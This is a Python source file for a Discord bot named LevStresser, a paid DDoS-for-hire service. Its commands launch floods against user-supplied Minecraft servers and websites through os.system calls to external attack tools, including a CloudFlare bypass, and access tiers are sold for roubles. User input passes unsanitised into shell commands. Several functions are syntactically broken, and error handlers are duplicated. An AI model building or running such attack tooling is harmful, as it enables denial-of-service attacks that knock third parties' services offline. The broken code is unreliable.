import threading
import discord
import disnake
import psutil
import random
import string
import json
import tkinter
import os
import mcstatus
import aiohttp
import asyncio
from discord_components import DiscordComponents, Button, ButtonStyle
import time
import daytime
from bs4 import BeautifulSoup

from datetime import datetime
from tkinter import *
from disnake.ext import commands
from mcstatus import *
from discord.ext import commands
from discord.utils import get
from discord import utils
from discord.utils import escape_mentions

@bot.event
async def on_command_error(ctx, error):
	if isinstance(error, commands.CommandOnCooldown):
		await ctx.send(f"{round(error.retry_after, 2)} seconds left")

@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def command(ctx):
	await ctx.send("Пиши команду!")

token = ""

channel_id = 1072376537862647828

admin_role = 1062008011620630689
killer_role = 1076914672227340460
extreme_role = 1072541471087005696
storm_role = 1062008122157306026
gold_role = 1062008267280232558

methods_gold = ['BungeeDowner', 'Bungeedowner', 'bungeeDowner', 'bungeedowner', 'bigpacket', 'Bigpacket', 'BigPacket', 'memory', 'Memory', 'mEmory', 'meMory', 'memOry', 'memoRy', 'memorY', 'MEMORY', 'MEMORy', 'MEMOrY', 'MEMoRY', 'MEmORY', 'MeMORY', 'mEMORY', 'MEMOry', 'MEMorY', 'MEmoRY', 'MemORY', 'meMORY', 'MeMoRy', 'mEmOrY', 'MemoRy', 'MeMory', 'meMoRy', 'mEmorY', 'mEmOry', 'memOrY', 'MemorY', 'mEmoRy', 'meMOry', 'MEMory', 'MEmorY', 'MemoRY', 'memORY', 'ram', 'Ram', 'rAm', 'raM', 'RaM', 'RAm', 'rAM', 'newnullping', 'Newnullping', 'newNullping', 'newnullPing', 'NewNullPing', 'newNullPing', 'NewNullping', 'NewnullPing', 'nullping', 'NullPing', 'Nullping', 'nullPing',]
methods_storm = ['BungeeDowner', 'Bungeedowner', 'bungeeDowner', 'bungeedowner', 'memory', 'Memory', 'mEmory', 'meMory', 'memOry', 'memoRy', 'memorY', 'MEMORY', 'MEMORy', 'MEMOrY', 'MEMoRY', 'MEmORY', 'MeMORY', 'mEMORY', 'MEMOry', 'MEMorY', 'MEmoRY', 'MemORY', 'meMORY', 'MeMoRy', 'mEmOrY', 'MemoRy', 'MeMory', 'meMoRy', 'mEmorY', 'mEmOry', 'memOrY', 'MemorY', 'mEmoRy', 'meMOry', 'MEMory', 'MEmorY', 'MemoRY', 'memORY', 'ram', 'Ram', 'rAm', 'raM', 'RaM', 'RAm', 'rAM', 'BigPacket', 'Bigpacket', 'bigPacket', 'bigpacket']
methods_extreme = ['BungeeDowner', 'Bungeedowner', 'bungeeDowner', 'bungeedowner', 'memory', 'Memory', 'mEmory', 'meMory', 'memOry', 'memoRy', 'memorY', 'MEMORY', 'MEMORy', 'MEMOrY', 'MEMoRY', 'MEmORY', 'MeMORY', 'mEMORY', 'MEMOry', 'MEMorY', 'MEmoRY', 'MemORY', 'meMORY', 'MeMoRy', 'mEmOrY', 'MemoRy', 'MeMory', 'meMoRy', 'mEmorY', 'mEmOry', 'memOrY', 'MemorY', 'mEmoRy', 'meMOry', 'MEMory', 'MEmorY', 'MemoRY', 'memORY']
methods_killer = ['BungeeDowner', 'Bungeedowner', 'bungeeDowner', 'bungeedowner', 'memory', 'Memory', 'mEmory', 'meMory', 'memOry', 'memoRy', 'memorY', 'MEMORY', 'MEMORy', 'MEMOrY', 'MEMoRY', 'MEmORY', 'MeMORY', 'mEMORY', 'MEMOry', 'MEMorY', 'MEmoRY', 'MemORY', 'meMORY', 'MeMoRy', 'mEmOrY', 'MemoRy', 'MeMory', 'meMoRy', 'mEmorY', 'mEmOry', 'memOrY', 'MemorY', 'mEmoRy', 'meMOry', 'MEMory', 'MEmorY', 'MemoRY', 'memORY']

bot = commands.Bot(command_prefix="%", intents=discord.Intents.all())
bot.remove_command('help')

@bot.event
async def on_ready():
    activity = discord.Game(name="%help | LevStresser")
    await bot.change_presence(status=discord.Status.online, activity=activity)
    print('\n Bot LevStresser connected!')

#Minecraft
@bot.command()
async def mc(ctx):
    embed=discord.Embed(title="Minecraft", color=0x00FF00)
    embed.add_field(name="**🔪 Killer атака 🔪**", value="``%extreme <ip:port> <protocol> <methods>``", inline=False)
    embed.add_field(name="**😈 Extreme атака 😈**", value="``%extreme <ip:port> <protocol> <methods>``", inline=False)
    embed.add_field(name="**🚀Storm атака🚀**", value="``%storm <ip:port> <protocol> <methods>``", inline=False)
    embed.add_field(name="**🚀Бесплатная атака🚀**", value="``%gold <ip:port> <protocol> <methods>``", inline=False)
    embed.add_field(name="**🚀Режимы атак🚀**", value="``%plans``", inline=False)
    embed.add_field(name="**🚀Методы🚀**", value="``%methods``", inline=False)
    embed.add_field(name="**🚀Проверка сервера🚀**", value="``%ping <ip>``", inline=False)
    embed.add_field(name="**🔎 Информация о сервере 🔎**", value="``%imcs <ip>``", inline=False)
    embed.set_footer(text="LevStresser | Free Stresser | Все права защищены 😈")
    await ctx.send(embed=embed)

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

#Help
@bot.command()
async def help(ctx):
    embed=discord.Embed(title="Menu", color=0x00FF00)
    embed.add_field(name="**🚀Minecraft DDoS🚀**", value="``%mc``", inline=False)
    embed.add_field(name="**🚀HTTP DDoS (Layer7)🚀**", value="``%layer7``", inline=False)
    embed.add_field(name="**🚀Инфо пользователя Discord🚀**", value="``%ds_user <Nickname#0001>``", inline=False)
    embed.add_field(name="**🔎 Информация об айпи адресе 🔎**", value="``%whois <ip/domen>``", inline=False)
    embed.set_footer(text="LevStresser | Free Stresser | Все права защищены 😈")
    await ctx.send(embed=embed)

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

#Layer7
@bot.command()
async def layer7(ctx):
    embed=discord.Embed(title="Layer 7", color=0x00FF00)
    embed.add_field(name="🔥 **CloudFlare (Storm)** 🔥", value="``%cf <url>``", inline=False)
    embed.add_field(name="📈 **HTTP-RAND (Extreme)** 📈", value="``%hr <url>``", inline=False)
    embed.set_footer(text="LevStresser | Free Stresser | Все права защищены 😈")
    await ctx.send(embed=embed)

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return


#CLOUDFLARE


@bot.command()
@commands.has_role(storm_role)
async def cf(ctx, url):
    def cf():
        os.system(f"node cf.js {url} 30 20")
    embed = discord.Embed(title="🔥 **CloudFlare** 🔥", color=0x00FF00)
    embed.set_author(name="LevStresser CloudFlare", icon_url="https://cdn.discordapp.com/attachments/1073932176325881936/1074293594225127505/fad74c02ae37fb9d.png")
    embed.add_field(name='Хост:', value=f'`` {url} ``', inline=True)
    embed.add_field(name='Время:', value='`` 30 ``', inline=True)
    embed.add_field(name='Потоки:', value='`` 20 ``', inline=True)
    embed.set_image(url=f'https://share.creavite.co/8tFUAtlttwves2SY.gif')
    embed.set_footer(text="LevStresser | Free Stresser | Все права защищены 😈", icon_url=ctx.author.avatar)

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

    t1 = threading.Thread(target=cf)
    t1.start()
    

    await ctx.message.add_reaction('😈')
    await ctx.send(embed=embed)
    
@cf.error
async def on_error_cf(ctx, error):
    if isinstance(error, commands.MissingRole):
        await ctx.send('⚠️ У вас нету роли **Storm** за **49 руб**!')
        await ctx.message.add_reaction('❌')
        return

#HTTP-RAND
@bot.command()
@commands.has_role(extreme_role)
async def hr(ctx, url):
    def hr():
        os.system(f"node HTTP-RAND.js {url} 30")
    embed=discord.Embed(title="📈 HTTP-RAND 📈", color=0x00FF00)
    embed.set_author(name="LevStresser HTTP-RAND", icon_url="https://cdn.discordapp.com/attachments/1073932176325881936/1074293594225127505/fad74c02ae37fb9d.png")
    embed.add_field(name='Хост:', value=f'`` {url} ``', inline=True)
    embed.add_field(name='Время:', value='`` 30 ``', inline=True)
    embed.add_field(name='Потоки:', value='`` 10 ``', inline=True)
    embed.set_image(url=f'https://share.creavite.co/8tFUAtlttwves2SY.gif')
    embed.set_footer(text="LevStresser | Free Stresser | Все права защищены 😈", icon_url=ctx.author.avatar)

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

    t1 = threading.Thread(target=hr)
    t1.start()

    await ctx.message.add_reaction('😈')
    await ctx.send(embed=embed)
    
@hr.error
async def on_error_hr(ctx, error):
    if isinstance(error, commands.MissingRole):
        await ctx.send('⚠️ У вас нету роли **Extreme** за **249 руб**!')
        await ctx.message.add_reaction('❌')
        return

#Status
@bot.command()
@commands.has_role(admin_role)
async def status(ctx):
    SUKAAA = round(psutil.virtual_memory().used / 1000000000, 2)
    memory = f"{SUKAAA}GB"
    embed = discord.Embed(title="Статус Бота", color=0x00FF00)
    embed.add_field(name = '**CPU:**', value = f'{psutil.cpu_percent()}%', inline = False)
    embed.add_field(name= '**RAM:**', value=memory)
    await ctx.send(embed = embed)

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

@status.error
async def on_error_status(ctx, error):
    if isinstance(error, commands.MissingRole):
        await ctx.send('⚠️ У вас нету роли **Admin**!')
        await ctx.message.add_reaction('❌')
        return

#Load Proxies
@bot.command()
@commands.has_role(admin_role)
async def load_proxies(ctx):
    os.system(f"py load_proxies.py")
    embed = discord.Embed(title="Загружаем Proxy...", color=0x00FF00)
    embed.add_field(name = '**Команда выполнена Администратором**', inline = False)
    await ctx.send(embed = embed)

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

@load_proxies.error
async def on_error_loadp(ctx, error):
    if isinstance(error, commands.MissingRole):
        await ctx.send('⚠️ У вас нету роли **Admin**!')
        await ctx.message.add_reaction('❌')
        return

#Protocols
@bot.command()
async def protocols(ctx):
    embed=discord.Embed(title="Меню -> Minecraft -> Протоколы", color=0x00FF00)
    embed.add_field(name='**1.19.3**', value='``761``', inline=True)
    embed.add_field(name='**1.19.2**', value='``760``', inline=True)
    embed.add_field(name='**1.19.1**', value='``760``', inline=True)
    embed.add_field(name='**1.19.0**', value='``759``', inline=True)
    embed.add_field(name='**1.18.2**', value='``758``', inline=True)
    embed.add_field(name='**1.18.0**', value='``757``', inline=True)
    embed.add_field(name='**1.17.0**', value='``755``', inline=True)
    embed.add_field(name='**1.18.2**', value='``758``', inline=True)
    embed.add_field(name='**1.17.1**', value='``756``', inline=True)
    embed.add_field(name='**1.17.0**', value='``755``', inline=True)
    embed.add_field(name='**1.16.5**', value='``754``', inline=True)
    embed.add_field(name='**1.16.4**', value='``754``', inline=True)
    embed.add_field(name='**1.16.3**', value='``753``', inline=True)
    embed.add_field(name='**1.16.2**', value='``751``', inline=True)
    embed.add_field(name='**1.16.1**', value='``736``', inline=True)
    embed.add_field(name='**1.16.0**', value='``735``', inline=True)
    embed.add_field(name='**1.15.2**', value='``578``', inline=True)
    embed.add_field(name='**1.15.1**', value='``575``', inline=True)
    embed.add_field(name='**1.15.0**', value='``573``', inline=True)
    embed.add_field(name='**1.14.4**', value='``498``', inline=True)
    embed.add_field(name='**1.14.3**', value='``490``', inline=True)
    embed.add_field(name='**1.14.2**', value='``485``', inline=True)
    embed.add_field(name='**1.14.1**', value='``480``', inline=True)
    embed.add_field(name='**1.14.0**', value='``477``', inline=True)
    embed.add_field(name='**1.13.2**', value='``404``', inline=True)
    embed.add_field(name='**1.13.1**', value='``401``', inline=True)
    embed.add_field(name='**1.13.0**', value='``393``', inline=True)
    embed.add_field(name='**1.12.2**', value='``340``', inline=True)
    embed.add_field(name='**1.12.1**', value='``338``', inline=True)
    embed.add_field(name='**1.12.0**', value='``335``', inline=True)
    embed.add_field(name='**1.11.0**', value='``316``', inline=True)
    embed.add_field(name='**1.10.0**', value='``210``', inline=True)
    embed.add_field(name='**1.9.3**', value='``110``', inline=True)
    embed.add_field(name='**1.9.2**', value='``109``', inline=True)
    embed.add_field(name='**1.9.1**', value='``108``', inline=True)
    embed.add_field(name='**1.9.0**', value='``107``', inline=True)
    embed.add_field(name='**1.8.0**', value='``47``', inline=True)
    embed.set_footer(text="LevStresser | Free Stresser | Все права защищены 😈")
    await ctx.send(embed=embed) 

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

#Methods
@bot.command()
async def methods(ctx):
    embed=discord.Embed(title="Меню -> Minecraft -> Методы", color=0x00FF00)
    embed.add_field(name='**Methods**', value='``Канал  Methods``', inline=True)
    embed.set_footer(text="LevStresser | Free Stresser | Все права защищены 😈")
    await ctx.send(embed=embed)

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

#Plans
@bot.command()
async def plans(ctx):

    await ctx.send('''``

Тариф: Gold
Сила: 100 Bots/sec
Макс. сила: 1000 Bots/sec
Время: 30 Seconds
Нету методов: Ram, NewNullPing, NullPing

Тариф: Storm
Сила: 1000 Bots/sec
Макс. сила: 1500 Bots/sec
Время: 50 Seconds
Методы: Нету

Тариф: 😈 Extreme 😈
Сила: 1500 Bots/sec
Макс. сила: 2000 Bots/sec
Load Test Time: 60 Seconds
Методы: Все

Тариф: Killer
Сила: 2000 Bots/sec
Макс. сила: 3000 Bots/sec
Время: 60 Seconds
Методы: Все

``''')

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

@bot.command(name='whois')
async def whois(ctx, arg1):
   if arg1 == "":
       await ctx.send("Напишите аргументы!")
   else:
       async with aiohttp.ClientSession() as session:
                async with session.get(f"http://ip-api.com/json/{arg1}?fields=66846719") as r:
                    js = await r.json()
                    myip = ('')
                    if myip == (js["query"]):
                        await ctx.send('Неизвестный айпи!')
                    else:
                        cont = (js["continent"])
                        country = (js["country"])
                        region = (js["regionName"])
                        city = (js["city"])
                        zipcode = (js["zip"])
                        iso = (js["isp"])
                        org = (js["org"])
                        reverse = (js["reverse"])
                        mobile = (js["mobile"])
                        proxy = (js["proxy"])
                        hosting = (js["hosting"])
                        embed1 = discord.Embed(title=(js["query"]), color=0x00FF00)
                        embed1.add_field(name="", value=(f" \n"
                                                                         f"Континент: {cont} \n \n "
                                                                         f"Страна: {country} \n \n "
                                                                         f"Регион: {region} \n \n "
                                                                         f"Город: {city} \n \n"
                                                                         f"Идекс: {zipcode} \n \n"
                                                                         f"Провайдер: {iso} \n \n"
                                                                         f"Организация: {org} \n \n"
                                                                         f"Имя компьютера: {reverse} \n \n"
                                                                         f"Телефон: {mobile} \n \n"
                                                                         f"Прокси: {proxy} \n \n"
                                                                         f"Хостинг: {hosting} \n \n"
                                                                         f""
                                                                         f"Пингующий: {ctx.author.mention}"), inline=False)
                        embed1.set_footer(text="LevStresser | Free Stresser | Все права защищены 😈")
                        await ctx.message.add_reaction('😈')
                        await ctx.send(embed=embed1)
 

@bot.command(name='imcs')
async def imcs(ctx, arg2):
   if arg2 == "":
       await ctx.send("Напишите аргументы!")
   else:
       async with aiohttp.ClientSession() as session:
                async with session.get(f"https://api.mcsrvstat.us/2/{arg2}") as r:
                        js = await r.json()
                        ip = (js["ip"])
                        online = (js["online"])
                        version = (js["version"])
                        protocol = (js["protocol"])
                        embed1 = discord.Embed(title="LevStresser", color=0x00FF00)
                        embed1.add_field(name="", value=(f" \n"
                                                                         f"**Айпи** ➜ {ip} \n \n "
                                                                         f"**Онлайн** ➜ {online} \n \n "
                                                                         f"**Ядро** ➜ {version} \n \n "
                                                                         f"**Протокол** ➜ {protocol} \n \n"
                                                                         f""
                                                                         f"**Пингующий** ➜ {ctx.author.mention}"), inline=False)
                        embed1.set_image(url=f'http://status.mclive.eu/LevStresser/{arg2}/banner.png')
                        embed1.set_footer(text="LevStresser | Free Stresser | Все права защищены 😈")
                        await ctx.message.add_reaction('😈')
                        await ctx.send(embed=embed1)
@imcs.error
async def on_error_imcs(ctx, error):
    if isinstance(error, commands.CommandInvokeError):
        await ctx.send('🚧 Такой сервер в Minecraft не найден!')
        await ctx.message.add_reaction('❌')
        return

@imcs.error
async def on_error_imcs(ctx, error):
    if isinstance(error, commands.CommandInvokeError):
        await ctx.send('🚧 Такой сервер в Minecraft не найден!')
        await ctx.message.add_reaction('❌')
        return


@bot.command(name='randomproxy')
async def randomproxy(ctx, arg2):
   if arg2 == "":
       await ctx.send("Напишите аргументы!")
   else:
       async with aiohttp.ClientSession() as session:
                async with session.get(f"https://public.freeproxyapi.com/api/Proxy/Mini.json") as r:
                        js = await r.json()
                        host = (js["host"])
                        port = (js["port"])
                        type = (js["type"])
                        embed1 = discord.Embed(title="LevStresser", color=0x00FF00)
                        embed1.add_field(name="", value=(f" \n"
                                                                         f"**Айпи Прокси** ➜ {host} \n \n "
                                                                         f"**порт** ➜ {port} \n \n "
                                                                         f"**Тип Прокси** ➜ {type} \n \n "
                                                                         f"**отправил ->** ➜ {ctx.author.mention}"), inline=False)
                        embed1.set_footer(text="LevStresser | Free Stresser | Все права защищены 😈")
                        await ctx.message.add_reaction('😈')
                        await ctx.send(embed=embed1)
@imcs.error
async def on_error_imcs(ctx, error):
    if isinstance(error, commands.CommandInvokeError):
        await ctx.send('🚧 такой команды не существует!!')
        await ctx.message.add_reaction('❌')
        return

@imcs.error
async def on_error_imcs(ctx, error):
    if isinstance(error, commands.CommandInvokeError):
        await ctx.send('🚧 не обнаружено')
        await ctx.message.add_reaction('❌')
        return



#Info User
@bot.command()
@commands.has_role(gold_role)
async def ds_user(ctx,member:discord.Member = None, guild: discord.Guild = None):
    if member == None:
        emb = discord.Embed(title="Информация о пользователе", color=0x00FF00)
        emb.add_field(name="Имя:", value=ctx.message.author.display_name,inline=False)
        emb.add_field(name="Айди пользователя:", value=ctx.message.author.id,inline=False)
        t = ctx.message.author.status
        if t == discord.Status.online:
            d = ":green_circle: В сети"

        t = ctx.message.author.status
        if t == discord.Status.offline:
            d = ":black_circle: Не в сети"

        t = ctx.message.author.status
        if t == discord.Status.idle:
            d = ":yellow_circle: Не активен"

        t = ctx.message.author.status
        if t == discord.Status.dnd:
            d = ":red_circle: Не беспокоить"

        emb.add_field(name="Активность:", value=d,inline=False)
        emb.add_field(name="Статус:", value=ctx.message.author.activity,inline=False)
        emb.add_field(name="Акаунт был создан:", value=ctx.message.author.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"),inline=False)
        emb.set_thumbnail(url=ctx.message.author.avatar_url)
        await ctx.message.add_reaction('😈')
        await ctx.send(embed = emb)
    else:
        emb = discord.Embed(title="Информация о пользователе", color=member.color)
        emb.add_field(name="Имя:", value=member.display_name,inline=False)
        emb.add_field(name="Айди пользователя:", value=member.id,inline=False)
        t = member.status
        if t == discord.Status.online:
            d = ":green_circle: В сети"

        t = member.status
        if t == discord.Status.offline:
            d = ":black_circle: Не в сети"

        t = member.status
        if t == discord.Status.idle:
            d = ":yellow_circle: Не активен"

        t = member.status
        if t == discord.Status.dnd:
            d = ":red_circle: Не беспокоить"
        emb.add_field(name="Активность:", value=d,inline=False)
        emb.add_field(name="Статус:", value=member.activity,inline=False)
        emb.add_field(name="Акаунт был создан:", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"),inline=False)
        await ctx.message.add_reaction('😈')
        await ctx.send(embed = emb)

#Attack Free
#@splash.splash(name = 'Gold', description = 'Стрессить Minecraft сервер', options = [{"name": "ip", "description",: "Айпи", "type": 6, "required": True}], guilds_ids = [1061652970187530260])
@bot.command()
@commands.has_role(gold_role)
async def gold(ctx, ip, protocol, method):  
    def gold():
        os.system(f"java -jar LevStresser.jar {ip} {protocol} {method} 30 1000 n")
    embed=discord.Embed(title="Атака запущена!", color=0x00FF00)
    embed.set_author(name="LevStresser Gold", icon_url="https://cdn.discordapp.com/attachments/1073932176325881936/1074293594225127505/fad74c02ae37fb9d.png")
    embed.add_field(name=':video_game: Айпи', value=f'┗ `` {ip} `` ', inline=True)
    embed.add_field(name=':bust_in_silhouette: CPS', value=f'┗ `` 100-1000 `` ', inline=True)
    embed.add_field(name=':bomb: Метод', value=f'┗ `` {method} `` ', inline=True)
    embed.add_field(name=':jigsaw: Протокол', value=f'┗ `` {protocol} `` ', inline=True)
    embed.add_field(name=':clock4: Время', value='┗ `` 30 `` ', inline=True)
    embed.set_image(url=f'http://status.mclive.eu/LevStresser_Gold/{ip}/banner.png')
    embed.set_footer(text="LevStresser | Free Stresser | Все права защищены 😈", icon_url=ctx.author.avatar)

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

    if method in methods_gold:
        embed=discord.Embed(title="``❌ Этот метод недействителен. | Купи Storm)``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

    t1 = threading.Thread(target=gold)
    t1.start()

    await ctx.message.add_reaction('😈')
    await ctx.send(embed=embed)


@bot.command()
@commands.has_role(gold_role)
async def inside(ctx, user):  
    def inside():
    embed=discord.Embed(title="info!", color=0x00FF00)
    embed.set_author(name="LevStresser Gold", icon_url="https://cdn.discordapp.com/attachments/1073932176325881936/1074293594225127505/fad74c02ae37fb9d.png")
    embed.add_field(name=':video_game: User', value=f'┗ `` {user} `` ', inline=True)
    embed.set_image(url=f'https://minecraft-statistic.net/ru/userbars/560x90/player/{user}.png')
    embed.set_footer(text="LevStresser | Free Stresser | Все права защищены 😈", icon_url=ctx.author.avatar)

    if ctx.message.channel.id != channel_id:
        embed=discord.Embed(title="``❌ Этот чат недействителен.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

    if method in methods_gold:
        embed=discord.Embed(title="``❌ Этот метод недействителен. | Купи Storm)``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

    t1 = threading.Thread(target=gold)
    t1.start()

    await ctx.message.add_reaction('😈')
    await ctx.send(embed=embed)


@gold.error
async def on_error_golder(ctx, error):
    if isinstance(error, commands.MissingRole):
        await ctx.send('⚠️ У вас нету роли **Gold**!')
        await ctx.message.add_reaction('❌')
        return

@gold.error
async def on_error_gold(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('🚧 Вы допустили ошибку в аргументах!')
        await ctx.message.add_reaction('❌')
        return

#Attack Storm
@bot.command()
@commands.has_role(storm_role)
async def storm(ctx, ip, protocol, method):  
    def storm():
        os.system(f"java -jar LevStresser.jar {ip} {protocol} {method} 50 1500 n")
        else: 
        await ctx.send("неправильный метод")
    embed=discord.Embed(title="Атака запущена!", color=0x00FF00)
    embed.set_author(name="LevStresser Storm", icon_url="https://cdn.discordapp.com/attachments/1073932176325881936/1074293594225127505/fad74c02ae37fb9d.png")
    embed.add_field(name=':video_game: Айпи', value=f'┗ `` {ip} `` ', inline=True)
    embed.add_field(name=':bust_in_silhouette: CPS', value=f'┗ `` 100-1500 `` ', inline=True)
    embed.add_field(name=':bomb: Метод', value=f'┗ `` {method} `` ', inline=True)
    embed.add_field(name=':jigsaw: Протокол', value=f'┗ `` {protocol} `` ', inline=True)
    embed.add_field(name=':clock4: Время', value='┗ `` 50 `` ', inline=True)
    embed.set_image(url=f'http://status.mclive.eu/LevStresser_Storm/{ip}/banner.png')
    embed.set_footer(text="LevStresser | Free Stresser | Все права защищены 😈", icon_url=ctx.author.avatar)

    if method in methods_storm:
        embed=discord.Embed(title="``❌ Этот метод недействителен. | Купите Extreme``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

    t1 = threading.Thread(target=storm)
    t1.start()

    await ctx.message.add_reaction('😈')
    await ctx.send(embed=embed)


@storm.error
async def on_error_stormer(ctx, error):
    if isinstance(error, commands.MissingRole):
        await ctx.send('🚧 У вас нету роли **Storm** за **49 руб**!')
        await ctx.message.add_reaction('❌')
        return

@storm.error
async def on_error_storm(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('🚧 Вы допустили ошибку в аргументах!')
        await ctx.message.add_reaction('❌')
        return

@bot.command()
@commands.has_role(extreme_role)
async def extreme(ctx, ip, protocol, method):
    def extreme():
        os.system(f"java -jar LevStresser.jar {ip} {protocol} {method} 60 2000 n")
    embed=discord.Embed(title="😈 Атака запущена! 😈", color=0x00FF00)
    embed.set_author(name="LevStresser Extreme", icon_url="https://cdn.discordapp.com/attachments/1073932176325881936/1074293594225127505/fad74c02ae37fb9d.png")
    embed.add_field(name='🎮 Айпи', value=f'┗  {ip}  ', inline=True)
    embed.add_field(name='👤 CPS', value=f'┗  200-2000  ', inline=True)
    embed.add_field(name='💣 Метод', value=f'┗  {method}  ', inline=True)
    embed.add_field(name='🧩 Протокол', value=f'┗  {protocol}  ', inline=True)
    embed.add_field(name='🕓 Время', value='┗  60  ', inline=True)
    embed.set_image(url=f'http://status.mclive.eu/LevStresser_Extreme/{ip}/banner.png')
    embed.set_footer(text="LevStresser | Free Stresser | Все права защищены 😈", icon_url=ctx.author.avatar)

    if method in methods_extreme:
        embed=discord.Embed(title="❌ Этот метод запрещён администрацией.", color=0x00FF00)
        await ctx.send(embed=embed)
        return

    t1 = threading.Thread(target=extreme)
    t1.start()

    await ctx.message.add_reaction('😈')
    await ctx.send(embed=embed)

@extreme.error
async def on_error_extremer(ctx, error):
    if isinstance(error, commands.MissingRole):
        await ctx.send('⚠️ У вас нету роли **Extreme** за **149 руб**!')
        await ctx.message.add_reaction('❌')
        return

@extreme.error
async def on_error_extreme(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('🚧 Вы допустили ошибку в аргументах!')
        await ctx.message.add_reaction('❌')
        return

#Attack Killer
@bot.command()
@commands.has_role(killer_role)
async def killer(ctx, ip, protocol, method):
    def killer():
        os.system(f"java -jar LevStresser.jar {ip} {protocol} {method} 60 3000 n")
    embed=discord.Embed(title="🔪 Атака запущена! 🔪", color=0x00FF00)
    embed.set_author(name="LevStresser Killer", icon_url="https://cdn.discordapp.com/attachments/1073932176325881936/1074293594225127505/fad74c02ae37fb9d.png")
    embed.add_field(name=':video_game: Айпи', value=f'┗ `` {ip} `` ', inline=True)
    embed.add_field(name=':bust_in_silhouette: CPS', value=f'┗ `` 200-3000 `` ', inline=True)
    embed.add_field(name=':bomb: Метод', value=f'┗ `` {method} `` ', inline=True)
    embed.add_field(name=':jigsaw: Протокол', value=f'┗ `` {protocol} `` ', inline=True)
    embed.add_field(name=':clock4: Время', value='┗ `` 60 `` ', inline=True)
    embed.set_image(url=f'http://status.mclive.eu/LevStresser_Killer/{ip}/banner.png')
    embed.set_footer(text="LevStresser | Free Stresser | Все права защищены 😈", icon_url=ctx.author.avatar) 

    if method in methods_killer:
        embed=discord.Embed(title="``❌ Этот метод запрещён администрацией.``", color=0x00FF00)
        await ctx.send(embed=embed)
        return

    t1 = threading.Thread(target=killer)
    t1.start()

    await ctx.message.add_reaction('😈')
    await ctx.send(embed=embed)

@killer.error
async def on_error_killerer(ctx, error):
    if isinstance(error, commands.MissingRole):
        await ctx.send('⚠️ У вас нету роли **Killer** за **249 руб**!')
        await ctx.message.add_reaction('❌')
        return

@killer.error
async def on_error_killer(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('🚧 Вы допустили ошибку в аргументах!')
        await ctx.message.add_reaction('❌')
        return
















































































bot.run('')